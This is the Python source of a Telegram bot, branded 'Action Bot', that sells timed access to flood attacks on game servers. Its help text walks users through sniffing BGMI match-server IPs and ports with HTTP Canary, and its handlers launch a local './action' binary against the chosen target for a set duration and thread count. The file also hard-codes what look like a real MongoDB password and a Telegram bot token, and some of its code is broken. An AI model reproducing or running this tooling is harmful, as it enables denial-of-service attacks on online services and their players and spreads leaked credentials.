import os
import re
import subprocess
import telebot
from threading import Timer
import time
import ipaddress
import logging
import random
from telebot.types import ReplyKeyboardMarkup, KeyboardButton, InputFile, InlineKeyboardMarkup, InlineKeyboardButton
from datetime import datetime, timedelta
import pytz
import requests
from collections import defaultdict
from pymongo import MongoClient
import asyncio
import threading

# MongoDB setup
MONGO_URI = "mongodb+srv://lm6000k:IBRSupreme@ibrdata.uo83r.mongodb.net/"
client = MongoClient(MONGO_URI)
 
# Database and collection
db = client['action']  # Replace 'action' with your database name if different
actions_collection = db['action']  # 'action' is the collection name

# Initialize logging for better monitoring
logging.basicConfig(filename='bot_actions.log', level=logging.INFO, 
                    format='%(asctime)s - %(message)s')

# Initialize the bot with the token from environment variables
TOKEN = "7267969157:AAFBW9fqZYa1kMnAB9CerIxWQnJ0-6c7Wns"
if not TOKEN:
    raise ValueError("Please set your bot token in the environment variables!")

bot = telebot.TeleBot(TOKEN)

# Timezone for Kolkata (GMT +5:30)
kolkata_tz = pytz.timezone('Asia/Kolkata')

# Time interval for auto-clearing (in seconds, e.g., 24 hours = 86400 seconds)
HISTORY_CLEAR_INTERVAL = 3600     # 86400   24 hours and this for 1 hour

# File to store authorizations
AUTHORIZATION_FILE = 'authorizations.txt'

# List of authorized users (initially empty, to be loaded from file)
authorized_users = {}

# List of authorized user IDs (admins)
AUTHORIZED_USERS = [6800732852, 5113311276]

# List of blocked ports
BLOCKED_PORTS = [8700, 20000, 443, 17500, 9031, 20002, 20001]

# Regex pattern to match the IP, port, and duration
pattern = re.compile(r"(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b)\s(\d{1,5})\s(\d+)")

# Dictionary to keep track of subprocesses and timers
processes = {}

# Dictionary to store user modes (manual or auto)
user_modes = {}

# Store supporter mode status for users
supporter_users = {}

# Store processes and temporary data for each user
processes = defaultdict(dict)

start_time = datetime.now(pytz.utc)  # Add at top of script

# Dictionary to track actions by user
active_users = {}  # Format: {user_id: {"username": str, "action": str, "process": subprocess, "expire_time": datetime}}
# Authorize a user and set expiration in Kolkata timezone
def authorize_user(user_id, expire_time):
    # Convert expire_time to UTC for storing in MongoDB
    expire_time_utc = expire_time.astimezone(pytz.utc)
    
    # Update or insert the user's authorization into MongoDB
    actions_collection.update_one(
        {'user_id': user_id},
        {
            '$set': {
                'status': 'authorized',
                'expire_time': expire_time_utc
            }
        },
        upsert=True
    )
#History 
def clear_user_history_automatically():
    """Automatically clear the most recent 5 history entries for all users."""
    now = datetime.now(kolkata_tz)
    logging.info(f"Running automatic history clear at {now.strftime('%Y-%m-%d %H:%M:%S')}")

    # Get all unique user_ids from the actions collection
    unique_users = actions_collection.distinct("user_id")

    for user_id in unique_users:
        # Find the user's most recent 5 actions
        user_actions = actions_collection.find({"user_id": user_id}).sort("timestamp", -1).limit(5)
        action_ids = [action["_id"] for action in user_actions]

        if action_ids:
            # Delete the most recent 5 actions
            result = actions_collection.delete_many({"_id": {"$in": action_ids}})
            if result.deleted_count > 0:
                logging.info(f"Auto-cleared {result.deleted_count} history entries for user {user_id}")
                # Optionally notify the user (uncomment if desired)
                # bot.send_message(user_id, f"🗑️ *Your last {result.deleted_count} actions were automatically cleared.*", parse_mode='Markdown')

    # Schedule the next run
    Timer(HISTORY_CLEAR_INTERVAL, clear_user_history_automatically).start()
    
# Save authorizations to MongoDB with Kolkata timezone handling
def save_authorizations():
    for user_id, info in authorized_users.items():
        # Convert expire_time to Kolkata timezone
        expire_time_kolkata = info['expire_time'].astimezone(kolkata_tz)
        
        # Convert Kolkata time to UTC for MongoDB storage
        expire_time_utc = expire_time_kolkata.astimezone(pytz.utc)
        
        # Upsert user information (update if exists, insert if new)
        actions_collection.update_one(
            {'user_id': user_id}, 
            {
                '$set': {
                    'status': info['status'],
                    'expire_time': expire_time_utc
                }
            },
            upsert=True
        )

def load_authorizations():
    global authorized_users
    authorized_users = {}

    # Fetch all users from MongoDB with "authorized" status
    users = actions_collection.find({"status": "authorized"})
    for user in users:
        user_id = str(user['user_id'])  # Ensure user_id is a string for consistency
        
        # Get the expire_time from MongoDB
        expire_time_str = user.get('expire_time')
        if not expire_time_str:
            logging.warning(f"No expire_time found for user {user_id}")
            continue

        # Ensure that the expire_time is a string before proceeding
        if not isinstance(expire_time_str, str):
            logging.error(f"expire_time is not a string for user {user_id}, got: {expire_time_str}")
            continue

        # Parse expire_time and handle potential conversion issues
        try:
            # Using dateutil.parser for more robust parsing of ISO strings
            expire_time_utc = parser.isoparse(expire_time_str).astimezone(pytz.UTC)
            
            # Convert UTC time to Kolkata timezone
            expire_time_kolkata = expire_time_utc.astimezone(kolkata_tz)
            
            # Replace the user's expire_time with the converted Kolkata time
            user['expire_time'] = expire_time_kolkata
        except (ValueError, TypeError) as e:
            logging.error(f"Failed to parse expire_time for user {user_id}: {e}")
            continue  # Skip this user if there's an error in parsing

        # Add the user to the authorized_users dictionary
        authorized_users[user_id] = user

    logging.info(f"Loaded {len(authorized_users)} authorized users with expiration times.")

def broadcast_message_to_all(message):
    """Function to broadcast a message to all users in the bot's user base."""
    all_users = actions_collection.find({}, {"user_id": 1})  # Assuming user_id is stored in MongoDB
    for user in all_users:
        try:
            bot.send_message(user['user_id'], message)
        except Exception as e:
            logging.error(f"Failed to send message to user {user['user_id']}: {str(e)}")
          
# Check if a user is authorized and their authorization hasn't expired
def is_authorized(user_id):
    user_info = actions_collection.find_one({'user_id': user_id})
    
    if user_info and user_info['status'] == 'authorized':
        now = datetime.now(kolkata_tz)
        expire_time = user_info['expire_time'].astimezone(kolkata_tz)
        if now < expire_time:
            return True
        else:
            # Authorization expired
            actions_collection.update_one(
                {'user_id': user_id},
                {'$set': {'status': 'expired'}}
            )
    return False

# Helper function to notify admins of a new authorization request
def notify_admins(user_id, username):
    message = (
        f"🔔 *New Authorization Request*\n\n"
        f"👤 User: @{username} (ID: {user_id})\n"
        f"⏳ Please approve or reject the request."
    )
    for admin_id in AUTHORIZED_USERS:
        bot.send_message(admin_id, message, parse_mode='Markdown')

# Validate IP
def is_valid_ip(ip):
    try:
        ipaddress.ip_address(ip)
        return True
    except ValueError:
        return False

# Validate port
def is_valid_port(port):
    return 1 <= int(port) <= 65535

# Validate duration
def is_valid_duration(duration):
    return int(duration) > 0 and int(duration) <= 600  # max 600 seconds (10 minutes)

# Periodically check for expired authorizations
def check_expired_users():
    now_kolkata = datetime.now(kolkata_tz)
    now_utc = now_kolkata.astimezone(pytz.utc)

    expired_users = actions_collection.find({
        'status': 'authorized',
        'expire_time': {'$lte': now_utc}
    })

    for user in expired_users:
        user_id = user['user_id']
        bot.send_message(user_id, "⛔ *Your access has expired! Please renew your access.*", parse_mode='Markdown')
        
        # Update user's status to 'expired' in MongoDB
        actions_collection.update_one(
            {'user_id': user_id},
            {'$set': {'status': 'expired'}}
        )

    # Check again after 15 minutes
    Timer(900, check_expired_users).start()

@bot.message_handler(commands=['start'])
def send_welcome(message):
    # Create the button markup
    markup = ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
    manual_button = KeyboardButton('Manual Mode')
    auto_button = KeyboardButton('Auto Mode')
    markup.add(manual_button, auto_button)

    welcome_text = (
        "👋 *Hey there! Welcome to Action Bot!*\n\n"
        "I'm here to help you manage actions easily and efficiently. 🚀\n\n"
        "🔹 To *start* an action, you can choose between:\n"
        "1. Manual Mode: Enter IP, port, and duration manually.\n"
        "2. Auto Mode: Enter IP and port, and I'll choose a random duration for you.\n\n"
        "🔹 Want to *stop* all ongoing actions? Just type:\n"
        "stop all\n\n"
        "🔐 *Important:* Only authorized users can use this bot in private chat. 😎\n\n"
        "📚 Press /help for instructions \n\n"
        "🤖 _This bot was made by Ibr._"
    )
    bot.reply_to(message, welcome_text, parse_mode='Markdown', reply_markup=markup)

@bot.message_handler(commands=['help'])
def send_help(message):
    help_text = (
        "📚 *Action Bot Help Guide* 📚\n\n"
        "Here’s how to capture an *IP* and *Port* from *HTTP Canary* while playing *BGMI* to use with this bot! 🚀\n\n"
        
        "🔹 *Step-by-Step Instructions* 🔹\n"
        "1️⃣ *Download HTTP Canary*:\n"
        "   - Install *HTTP Canary* from the Google Play Store or a trusted source. 📲\n\n"
        
        "2️⃣ *Start HTTP Canary*:\n"
        "   - Open the app and press the *Start* button (▶️) to begin capturing network traffic. 🌐\n\n"
        
        "3️⃣ *Launch BGMI*:\n"
        "   - Open *Battlegrounds Mobile India* and go to the *Match Lobby*. 🎮\n"
        "   - Wait until the timer shows before the match starts. ⏱️\n\n"
        
        "4️⃣ *Capture Traffic*:\n"
        "   - Switch back to *HTTP Canary* quickly. ⚡\n"
        "   - Look for *UDP* packets in the captured traffic (it’ll say 'UDP' in the protocol column). 📡\n\n"
        
        "5️⃣ *Find the IP and Port*:\n"
        "   - Scroll through the UDP packets and find one with a port between *10,000* and *30,000* (5 digits, e.g., 12345). 🔍\n"
        "   - The *IP address* will look like `192.168.x.x` or similar (e.g., `203.0.113.5`). Copy this IP. ✂️\n"
        "   - Copy the *Port* number next to it (e.g., `14567`). ✍️\n\n"
        
        "6️⃣ *Use with the Bot*:\n"
        "   - In *Manual Mode*: Send `<IP> <Port> <Duration>` (e.g., `203.0.113.5 14567 60`). 📩\n"
        "   - In *Auto Mode*: Send `<IP> <Port>` (e.g., `203.0.113.5 14567`), and I’ll pick a random duration. 🤖\n\n"
        
        "🎯 *Example*:\n"
        "   - Manual: `203.0.113.5 14567 60`\n"
        "   - Auto: `203.0.113.5 14567`\n\n"
        
        "⚠️ *Important Notes*:\n"
        "   - Ports like `8700, 20000, 443, 17500, 9031, 20002, 20001` are *blocked*. Use a port between *10,000-30,000* instead! 🚫\n"
        "   - Make sure you’re authorized with `/auth` before using me! 🔐\n\n"
        
        "💡 *Need Help?* Just ask, and I’ll guide you! 😎\n\n"
        "_This bot was made by Ibr._"
    )
    bot.reply_to(message, help_text, parse_mode='Markdown')

@bot.message_handler(commands=['ping'])
def ping_bot(message):
    now = datetime.now(pytz.utc)
    uptime = now - start_time
    bot.reply_to(message, f"🏓 *Pong!* Bot is alive.\n⏰ *Uptime:* {str(uptime).split('.')[0]}", parse_mode='Markdown')

@bot.message_handler(commands=['stats'])
def show_stats(message):
    user_id = message.from_user.id
    if user_id not in AUTHORIZED_USERS:
        bot.reply_to(message, "⛔ *Admins only!*", parse_mode='Markdown')
        return
    now = datetime.now(pytz.utc)
    today = now.replace(hour=0, minute=0, second=0, microsecond=0)
    total_actions = actions_collection.count_documents({"timestamp": {"$gte": today}})
    active_count = len(processes)
    authorized_count = actions_collection.count_documents({"status": "authorized"})
    stats = (
        f"📊 *Bot Stats (as of {now.astimezone(kolkata_tz).strftime('%Y-%m-%d %H:%M:%S')})*\n\n"
        f"👥 *Authorized Users:* {authorized_count}\n"
        f"⚡ *Active Actions:* {active_count}\n"
        f"📈 *Actions Today:* {total_actions}"
    )
    bot.reply_to(message, stats, parse_mode='Markdown')


# Mode selection handler
@bot.message_handler(func=lambda message: message.text in ['Manual Mode', 'Auto Mode'])
def set_mode(message):
    user_id = message.from_user.id
    selected_mode = message.text.lower().split()[0]  # 'manual' or 'auto'
    
    # Update the user's mode
    user_modes[user_id] = selected_mode
    bot.reply_to(message, f"🔄 *Mode switched to {selected_mode.capitalize()} Mode!*")
    
# Command to show the list of active users and actions (admin only)
@bot.message_handler(commands=['list_active'])
def list_active_users(message):
    user_id = message.from_user.id
    if user_id not in AUTHORIZED_USERS:
        bot.reply_to(message, "⛔ You are not authorized to view the active users.", parse_mode='Markdown')
        return

    if not active_users:
        bot.reply_to(message, "⚠️ No active users at the moment.", parse_mode='Markdown')
        return

    active_list = "🟢 *Active Users and Actions:*\n"
    for uid, info in active_users.items():
        action = info.get("action", "Unknown action")
        active_list += f"👤 User: {info['username']} (ID: {uid})\n🔹 Action: {action}\n\n"

    bot.reply_to(message, active_list, parse_mode='Markdown')

@bot.message_handler(commands=['approve'])
def approve_user(message):
    if message.chat.type != 'private' or message.from_user.id not in AUTHORIZED_USERS:
        bot.reply_to(message, "⛔ *You are not authorized to approve users.*", parse_mode='Markdown')
        return
    
    try:
        # Command format: /approve <user_id> <duration>
        _, user_id, duration = message.text.split()
        user_id = int(user_id)

        now = datetime.now(kolkata_tz)
        expire_time = None
        
        # Custom duration parsing
        time_match = re.match(r"(\d+)([dhm])", duration)
        if time_match:
            value, unit = time_match.groups()
            value = int(value)
            if unit == 'h':
                expire_time = now + timedelta(hours=value)
            elif unit == 'd':
                expire_time = now + timedelta(days=value)
            elif unit == 'm':
                expire_time = now + timedelta(days=30 * value)
        elif duration == 'permanent':
            expire_time = now + timedelta(days=365*100)  # 100 years for permanent
        
        if expire_time:
            # Save to MongoDB using the authorize_user function
            authorize_user(user_id, expire_time)

            bot.reply_to(message, f"✅ *User {user_id} has been authorized for {duration}!* 🎉", parse_mode='Markdown')
            bot.send_message(user_id, "🎉 *You are now authorized to use the bot! Enjoy!* 🚀", parse_mode='Markdown')
            logging.info(f"Admin {message.from_user.id} approved user {user_id} for {duration}")
        else:
            bot.reply_to(message, "❌ *Invalid duration format!* Please use 'Xd', 'Xh', 'Xm', or 'permanent'.", parse_mode='Markdown')

    except ValueError:
        bot.reply_to(message, "❌ *Invalid command format!* Use `/approve <user_id> <duration>`.", parse_mode='Markdown')

@bot.message_handler(commands=['reject'])
def reject_user(message):
    if message.chat.type != 'private' or message.from_user.id not in AUTHORIZED_USERS:
        bot.reply_to(message, "⛔ *You are not authorized to reject users.*", parse_mode='Markdown')
        return

    try:
        _, user_id = message.text.split()
        user_id = int(user_id)
        
        if user_id in authorized_users and authorized_users[user_id]['status'] == 'pending':
            authorized_users[user_id]['status'] = 'rejected'
            save_authorizations()
            bot.reply_to(message, f"🛑 *User {user_id}'s application has been rejected.*", parse_mode='Markdown')
            logging.info(f"Admin {message.from_user.id} rejected user {user_id}'s application.")

            # Notify the user that their application was rejected
            bot.send_message(user_id, "❌ *Your authorization request has been declined by the admin.*", parse_mode='Markdown')
        else:
            bot.reply_to(message, f"⚠️ *User {user_id} has no pending application.*", parse_mode='Markdown')

    except ValueError:
        bot.reply_to(message, "❌ *Invalid command format!* Use `/reject <user_id>`.", parse_mode='Markdown')


@bot.message_handler(commands=['remove'])
def remove_user(message):
    if message.chat.type != 'private' or message.from_user.id not in AUTHORIZED_USERS:
        bot.reply_to(message, "⛔ *You are not authorized to remove users.*", parse_mode='Markdown')
        return

    try:
        _, user_id = message.text.split()
        user_id = int(user_id)
        
        if str(user_id) in authorized_users:
            # Remove the user from the database
            actions_collection.delete_one({'user_id': user_id})
            
            # Remove from the in-memory authorized_users dictionary
            del authorized_users[str(user_id)]
            
            bot.reply_to(message, f"✅ *User {user_id} has been successfully removed.*", parse_mode='Markdown')
            logging.info(f"Admin {message.from_user.id} removed user {user_id}.")
            
            # Notify the user about their removal
            bot.send_message(user_id, "🛑 *Your authorization has been revoked by the admin.*", parse_mode='Markdown')
        else:
            bot.reply_to(message, f"⚠️ *User {user_id} is not in the authorized list.*", parse_mode='Markdown')

    except ValueError:
        bot.reply_to(message, "❌ *Invalid command format!* Use `/remove <user_id>`.", parse_mode='Markdown')


@bot.message_handler(commands=['auth'])
def request_authorization(message):
    user_id = message.from_user.id
    username = message.from_user.username if message.from_user.username else 'Unknown'

    # Check if the user is in the AUTHORIZED_USERS list (admins)
    if user_id in AUTHORIZED_USERS:
        bot.reply_to(message, "🎉 *You're already a trusted admin!* No need for authorization.", parse_mode='Markdown')
        return

    # Check if the user is already authorized and get their expiration time
    user_info = actions_collection.find_one({'user_id': user_id})
    
    if user_info and user_info['status'] == 'authorized':
        # Get and format expiration time in Kolkata timezone
        expire_time_utc = user_info['expire_time']
        expire_time_kolkata = expire_time_utc.astimezone(kolkata_tz)
        expire_time_str = expire_time_kolkata.strftime("%Y-%m-%d %H:%M:%S")
        
        # Reply to the user with authorization status and expiration time
        bot.reply_to(message, (
            f"🎉 *You're already authorized to use the bot!*\n\n"
            f"⏳ *Your authorization expires on:* {expire_time_str} (Asia/Kolkata time)"
        ), parse_mode='Markdown')
        return
    
    # If the user is not authorized, request authorization
    bot.reply_to(message, (
        f"🔒 *Authorization Requested!* Please wait for the admin to approve your request.\n\n"
        f"👤 Your user ID: {user_id}\n"
        f"👤 Username: @{username}\n\n"
        "An admin will review your request soon. 🙌"
    ), parse_mode='Markdown')

    # Notify all admins of the authorization request
    notify_admins(user_id, username)

    # Log the authorization request
    logging.info(f"User {user_id} ({username}) requested authorization")

@bot.message_handler(commands=['yell'])
def handle_yell(message):
    if message.from_user.id not in AUTHORIZED_USERS:
        bot.reply_to(message, "⛔ You are not authorized to use this command.", parse_mode="Markdown")
        return

    broadcast_message = message.text.replace("/yell", "").strip()
    if not broadcast_message:
        bot.reply_to(message, "❌ *Please provide a message to broadcast.*", parse_mode="Markdown")
        return

    keyboard = InlineKeyboardMarkup()
    confirm_button = InlineKeyboardButton("📢 Confirm Broadcast", callback_data=f"confirm_broadcast_{message.chat.id}")
    keyboard.add(confirm_button)

    bot.reply_to(message, f"📝 *Broadcast Preview:*\n\n{broadcast_message}", reply_markup=keyboard, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data.startswith("confirm_broadcast_"))
def confirm_broadcast(call):
    chat_id = int(call.data.split("_")[-1])
    broadcast_message = call.message.text.replace("📝 *Broadcast Preview:*\n\n", "")

    all_users = actions_collection.find({}, {"user_id": 1})
    for user in all_users:
        try:
            bot.send_message(user['user_id'], broadcast_message)
        except:
            pass

    bot.send_message(chat_id, "✅ *Broadcast sent to all users!*")

@bot.message_handler(commands=['history'])
def show_history(message):
    user_id = message.from_user.id
    if user_id not in AUTHORIZED_USERS and not is_authorized(user_id):
        bot.reply_to(message, "⛔ *You are not authorized!* Use /auth first.", parse_mode='Markdown')
        return
    history = actions_collection.find({"user_id": user_id}).sort("timestamp", -1).limit(5)  # Last 5 actions
    response = "📜 *Your Recent Actions:*\n\n"
    for action in history:
        ts = action['timestamp'].astimezone(kolkata_tz).strftime("%Y-%m-%d %H:%M:%S")
        response += f"🌍 IP: `{action['ip']}` | 🔌 Port: `{action['port']}` | ⏳ {action['duration']}s | Mode: {action['mode']} | ⏰ {ts}\n"
    bot.reply_to(message, response if history else "⚠️ *No action history found.*", parse_mode='Markdown')

# Function to set or get the thread value
def get_thread_value(user_id):
    """Retrieve the user's thread value or default to random if not set."""
    user_settings = actions_collection.find_one({'user_id': user_id})
    if user_settings and 'thread_value' in user_settings:
        return user_settings['thread_value']
    return random.choice([200, 200, 210])

def set_thread_value(user_id, value):
    """Set the user's preferred thread value in the database."""
    actions_collection.update_one(
        {'user_id': user_id},
        {'$set': {'thread_value': value}},
        upsert=True
    )

@bot.message_handler(commands=['setthread'])
def handle_setthread(message):
    """Allow users to set or view their preferred thread value."""
    user_id = message.from_user.id
    if user_id not in AUTHORIZED_USERS and not is_authorized(user_id):
        bot.reply_to(message, "⛔ You are not authorized to use this command.", parse_mode='Markdown')
        return

    # Check if the command has a value argument
    try:
        command, value = message.text.split()
        value = int(value)
        
        # Save the thread value
        set_thread_value(user_id, value)
        bot.reply_to(message, f"✅ Your thread value has been set to {value}.", parse_mode='Markdown')
    except ValueError:
        current_value = get_thread_value(user_id)
        bot.reply_to(
            message,
            f"🔍 Your current thread value is `{current_value}`.\n\n"
            "Use `/setthread <value>` to set your thread value.\n",
            parse_mode='Markdown'
        )
    except Exception as e:
        # View current thread value if no argument is provided
        current_value = get_thread_value(user_id)
        bot.reply_to(
            message,
            f"🔍 Your current thread value is `{current_value}`.\n\n"
            "Use `/setthread <value>` to update it.",
            parse_mode='Markdown'
        )

      
# Main message handler
@bot.message_handler(func=lambda message: True)
def handle_message(message):
    user_id = message.from_user.id
    chat_type = message.chat.type

    # Skip authorization check if the user is in the AUTHORIZED_USERS list
    if chat_type == 'private' and user_id not in AUTHORIZED_USERS and not is_authorized(user_id):
        bot.reply_to(message, '⛔ *You are not authorized to use this bot.* Please send /auth to request access. 🤔\n\n_This bot was made by Ibr._', parse_mode='Markdown')
        return

    text = message.text.strip().lower()

    # Check if the user wants to stop an ongoing action
    if text == 'stop action':
        stop_user_process(user_id, message)
        return

    user_mode = user_modes.get(user_id, 'manual')  # Default to 'manual' if mode not set

    if text == 'stop all':
        stop_all_actions(message)
        return

    # Regex to match "<ip> <port> <duration>" for manual mode or "<ip> <port>" for auto mode
    auto_mode_pattern = re.compile(r"(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b)\s(\d{1,5})")
    manual_mode_pattern = re.compile(r"(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b)\s(\d{1,5})\s(\d{1,4})")

    if user_mode == 'auto':
        # Auto mode logic
        match = auto_mode_pattern.match(text)
        if match:
            ip, port = match.groups()
            duration = random.randint(80, 240)  # Random duration for auto mode

            # Validate IP and Port
            if not is_valid_ip(ip):
                bot.reply_to(message, "❌ *Invalid IP address!* Please provide a valid IP.\n\n_This bot was made by Ibr._", parse_mode='Markdown')
                return
            if not is_valid_port(port):
                bot.reply_to(message, "❌ *Invalid Port!* Port must be between 1 and 65535.\n\n_This bot was made by Ibr._", parse_mode='Markdown')
                return
            if port in BLOCKED_PORTS:
                bot.reply_to(message, f"⛔ *Port {port} is blocked!* Please use a different port.\n\n_This bot was made by Ibr._", parse_mode='Markdown')
                return

            # Show the stop action button
            markup = ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
            stop_button = KeyboardButton('Stop Action')
            markup.add(stop_button)

            asyncio.run(run_action(user_id, message, ip, port, duration, user_mode))
        else:
            bot.reply_to(message, "⚠️ *Oops!* Please provide the IP and port in the correct format: `<ip> <port>`.\n\n_This bot was made by Ibr._", parse_mode='Markdown')

    elif user_mode == 'manual':
        # Manual mode logic
        match = manual_mode_pattern.match(text)
        if match:
            ip, port, duration = match.groups()

            # Validate IP, Port, and Duration
            if not is_valid_ip(ip):
                bot.reply_to(message, "❌ *Invalid IP address!* Please provide a valid IP.\n\n_This bot was made by Ibr._", parse_mode='Markdown')
                return
            if not is_valid_port(port):
                bot.reply_to(message, "❌ *Invalid Port!* Port must be between 1 and 65535.\n\n_This bot was made by Ibr._", parse_mode='Markdown')
                return
            if not is_valid_duration(duration):
                bot.reply_to(message, "❌ *Invalid Duration!* The duration must be between 1 and 600 seconds.\n\n_This bot was made by Ibr._", parse_mode='Markdown')
                return
            if port in BLOCKED_PORTS:
                bot.reply_to(message, f"⛔ *Port {port} is blocked!* Please use a different port.\n\n_This bot was made by Ibr._", parse_mode='Markdown')
                return
                
            # Show the stop action button
            markup = ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
            stop_button = KeyboardButton('Stop Action')
            markup.add(stop_button)

            asyncio.run(run_action(user_id, message, ip, port, duration, user_mode))
        else:
            bot.reply_to(message, (
                "⚠️ *Oops!* The format looks incorrect. Let's try again:\n"
                "`<ip> <port> <duration>`\n\n"
                "For example, type `192.168.1.100 8080 60` to run an action for 60 seconds.\n\n"
                "_This bot was made by Ibr._"
            ), parse_mode='Markdown')

# Function to stop a user's running process
def stop_user_process(user_id, message):
    # Check if the user has a running process
    if user_id in processes:
        process_info = processes.get(user_id)
        process = process_info['process']
        if process and process.poll() is None:  # Process is still running
            try:
                # Terminate the process
                process.terminate()
                process.wait()  # Wait for process to fully terminate
                bot.reply_to(message, "🛑 *Action stopped successfully!*", parse_mode='Markdown')

                # Log the stop action
                logging.info(f"User {user_id} stopped process PID: {process.pid}")

                # Remove the process from the tracking dictionary
                del processes[user_id]
            except Exception as e:
                logging.error(f"Error stopping process for user {user_id}: {str(e)}")
                bot.reply_to(message, "⚠️ *Error stopping the action. Please try again.*", parse_mode='Markdown')
        else:
            bot.reply_to(message, "⚠️ *No running process found to stop.*", parse_mode='Markdown')
    else:
        bot.reply_to(message, "⚠️ *No active action to stop.*", parse_mode='Markdown')

# Function to dynamically show stop action button for each user
def show_stop_action_button(message):
    markup = ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
    stop_button = KeyboardButton('Stop Action')
    markup.add(stop_button)
    #bot.send_message(message.chat.id, "🛑 *Press Stop Action to terminate your current action.*", reply_markup=markup, parse_mode='Markdown')



async def run_action(user_id, message, ip, port, duration, user_mode):
    try:
        thread_value = get_thread_value(user_id)
        # Convert duration to an integer
        duration = int(duration)  # Add this line to fix the issue
        
        sent_message = bot.send_message(
            message.chat.id,
            f"🔧 *Initializing action in {user_mode.capitalize()} Mode...* 💥\n\n"
            f"🌍 *Target IP:* `{ip}`\n"
            f"🔌 *Port:* `{port}`\n"
            f"⏳ *Duration:* `{duration} seconds`\n"
            f"💡 *Socket Value:* `{thread_value}`\n\n"
            "⚙️ *Processing request... Please wait.*",
            parse_mode="Markdown"
        )

        # Run subprocess asynchronously
        process = await asyncio.create_subprocess_exec(
            "./action", ip, port, str(duration), str(thread_value),
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )

        processes[user_id] = {'process': process}
        totalduration = int(duration)
        # Live progress updates
        while process.returncode is None:  # While process is running
            await asyncio.sleep(1)  # Update every 5 seconds
            duration -= 1
            if duration > 0:
                bot.edit_message_text(
                    chat_id=message.chat.id,
                    message_id=sent_message.message_id,
                    text=(
                        f"⚡ *Action in progress...* `{duration} seconds left`\n\n"
                        f"🌍 *Target IP:* `{ip}`\n"
                        f"🔌 *Port:* `{port}`\n"
                        f"💡 *Socket Value:* `{thread_value}`\n\n"
                        "🔄 *Executing... Please wait!*"
                    ),
                    parse_mode="Markdown"
                )
            else:
                break

        # Wait for process to complete
        stdout, stderr = await process.communicate()
        actions_collection.insert_one({
          "user_id": user_id,
          "ip": ip,
          "port": int(port),
          "duration": duration,
          "mode": user_mode,
          "timestamp": datetime.now(pytz.utc)
        })
        # Final update
        bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=sent_message.message_id,
            text=(
                f"✅ *Action completed successfully!* 🎉\n\n"
                f"🌐 *Target IP:* `{ip}`\n"
                f"🔌 *Port:* `{port}`\n"
                f"⏱ *Total Duration:* `{totalduration} seconds`\n"
                f"💡 *Socket Value:* `{thread_value}`\n\n"
                "🔎 *Review results and take further actions if needed.*"
            ),
            parse_mode="Markdown"
        )

    except ValueError as e:
        logging.error(f"❌ Invalid duration value for user {user_id}: {str(e)}")
        bot.reply_to(message, f"⚠️ *Invalid duration provided.* Please enter a valid number.", parse_mode="Markdown")
    except Exception as e:
        logging.error(f"❌ Error running action for user {user_id}: {str(e)}")
        bot.reply_to(message, f"⚠️ *An error occurred while processing your request.*: {str(e)}", parse_mode="Markdown")

def check_process_status(message, process, ip, port, duration):
    # Monitor the process and notify upon completion
    try:
        process.wait()  # Wait for the process to finish
        stdout, stderr = process.communicate()
        send_completion_message(message, ip, port, duration)
    except Exception as e:
        logging.error(f"Error checking process status: {str(e)}")
        bot.reply_to(message, "⚠️ *An error occurred while checking the process status.*", parse_mode='Markdown')

def send_completion_message(message, ip, port, duration):
    # Create button options for manual and auto modes
    markup = ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
    manual_button = KeyboardButton('Manual Mode')
    auto_button = KeyboardButton('Auto Mode')
    markup.add(manual_button, auto_button)

    # Send the completion message to the user
    bot.reply_to(message, (
        f"✅ *Action completed successfully!* 🎉\n\n"
        f"🌐 *Target IP:* `{ip}`\n"
        f"🔌 *Port:* `{port}`\n"
        f"⏱ *Duration:* `{duration} seconds`\n\n"
        "💡 *Need more help?* Just send me another request, I'm here to assist! 🤗\n\n"
        "_This bot was made by Ibr._"
    ), parse_mode='Markdown', reply_markup=markup)

def submit_task_to_worker(ip, port, duration):
    # Properly format the string using f-string
    Support_call = f'{ip} {port} {duration}'
    
    # URL-encode the message to handle spaces and special characters
    encoded_message = urllib.parse.quote(Support_call)

    # Send a GET request to the Telegram API to send the message
    try:
        response = requests.get(f'https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id=7399993709&text={encoded_message}')
        
        # Check if the request was successful
        if response.status_code == 200:
            print("Message sent successfully!")
        else:
            print(f"Failed to send message. Status code: {response.status_code}")
    
    except requests.exceptions.RequestException as e:
        print(f"Error sending message: {e}")
def stop_all_actions(message):
    if processes:
        for pid, process in list(processes.items()):
            process.terminate()
            process.wait()
            processes.pop(pid, None)
        bot.reply_to(message, "🛑 *All actions have been stopped!* 🙅‍♂️", parse_mode='Markdown')
    else:
        bot.reply_to(message, "🤔 *No ongoing actions to stop.*", parse_mode='Markdown')

# Start the bot
if __name__ == '__main__':
    
    logging.info("Starting the bot...")
    # Initialize authorized users when bot starts
    load_authorizations()
    # Start periodic expiration check when the bot starts
    check_expired_users()
    # Start automatic history clearing
    clear_user_history_automatically()
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        logging.error(f"Error occurred: {str(e)}")
